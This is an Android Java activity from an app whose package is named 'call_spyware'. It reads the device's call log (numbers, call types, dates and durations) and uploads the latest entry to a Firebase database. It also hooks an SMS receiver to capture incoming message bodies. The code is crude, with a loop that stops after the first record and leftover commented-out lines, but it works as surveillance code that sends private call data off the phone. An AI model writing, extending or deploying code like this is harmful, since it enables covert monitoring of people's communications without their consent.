package com.ngpmbewetu.call_spyware;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.CallLog;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.Snackbar;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.Date;

public class Main2Activity extends AppCompatActivity implements MessageListener {

    EditText phone_number,Call_type,Call_date,Call_duration;
   // String phoneNmber,callType,callDate,callDuration;
   Date callDayTime;
   String dir;
   Button button;

    Button submit;
    DatabaseReference reff;
    call_Info call_info;
    String phNumber,callDuration,callType,callDate;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main2);
        submit=(Button)findViewById(R.id.Submit);
        button=(Button)findViewById(R.id.button4);
        SMS_receiver.bindListener(this);
        reff= FirebaseDatabase.getInstance().getReference().child("callInfo");
        call_info=new call_Info();

        if (ContextCompat.checkSelfPermission(this, Manifest.
        permission.READ_PHONE_STATE)!= PackageManager.PERMISSION_GRANTED){

            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_PHONE_STATE},1);
        }
        // messege display

        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                getCallDetails();
            }
        });



        submit.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                StringBuffer sb = new StringBuffer();

                @SuppressLint("MissingPermission") Cursor cur = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, android.provider.CallLog.Calls.DATE + " DESC");

                int number = cur.getColumnIndex( CallLog.Calls.NUMBER );
                int duration = cur.getColumnIndex( CallLog.Calls.DURATION);
                int type = cur.getColumnIndex(CallLog.Calls.TYPE);
                int date = cur.getColumnIndex(CallLog.Calls.DATE);
                sb.append("Call Details : \n");

                while (cur.moveToNext()) {
                     phNumber = cur.getString( number );
                     callDuration = cur.getString( duration );
                     callType = cur.getString( type );
                     callDate = cur.getString( date );
                    callDayTime = new Date(Long.valueOf(callDate));
                    int dircode = Integer.parseInt(callType);
                    switch (dircode) {
                        case CallLog.Calls.OUTGOING_TYPE:
                            dir = "OUTGOING";
                            break;

                        case CallLog.Calls.INCOMING_TYPE:
                            dir = "INCOMING";
                            break;

                        case CallLog.Calls.MISSED_TYPE:
                            dir = "MISSED";
                            break;

                    // Toast.makeText(this, ""+name, Toast.LENGTH_SHORT).show();

                }
//                    sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "  + dir + " \nCall Date:--- " + callDayTime
//                            + " \nCall duration in sec :--- " + callDuration);
//                    sb.append("\n----------------------------------");
//                    Toast.makeText(Main2Activity.this, ""+phNumber+" "+dir+" "+callDayTime+" "+callDuration, Toast.LENGTH_SHORT).show();


                      Toast.makeText(Main2Activity.this, ""+callDuration, Toast.LENGTH_SHORT).show();
                      Toast.makeText(Main2Activity.this, ""+callDayTime, Toast.LENGTH_SHORT).show();
                      sb.append( "\nPhone Number:"+phNumber);

                    break;
                }
                cur.close();
                String str=sb.toString();

                call_info.setPhnumber(phNumber);
                call_info.setCall_type(dir);
                call_info.setCall_date(callDayTime);
                call_info.setCall_duration(callDuration);
                reff.push().setValue(call_info);
                Toast.makeText(Main2Activity.this, "data inserted succesfully", Toast.LENGTH_SHORT).show();


            }
        });
    }


    @Override
    public void messageReceived(String body){
        Toast.makeText(this, ""+body, Toast.LENGTH_SHORT).show();

    }

    @Override
    public void originatingNumber(String sender) {

    }

    @Override
    public void DisplayMessagebody(String displayBody) {

    }







    private String getCallDetails() {

        StringBuffer sb = new StringBuffer();
        Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null,
                null, null, null);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        // String name = managedCursor.getString(Integer.parseInt(CallLog.Calls.CACHED_NAME));
        sb.append("Call Details :");
        while (managedCursor.moveToNext()) {
            phNumber = managedCursor.getString(number);
            callType = managedCursor.getString(type);
            callDate = managedCursor.getString(date);
            callDayTime = new Date(Long.valueOf(callDate));
            callDuration = managedCursor.getString(duration);
            dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            // Toast.makeText(this, ""+name, Toast.LENGTH_SHORT).show();
            sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
                    + dir + " \nCall Date:--- " + callDayTime
                    + " \nCall duration in sec :--- " + callDuration);
            sb.append("\n----------------------------------");
            Toast.makeText(this, ""+phNumber+" "+dir+" "+callDayTime+" "+callDuration, Toast.LENGTH_SHORT).show();

        }
        managedCursor.close();
        return sb.toString();

    }


}
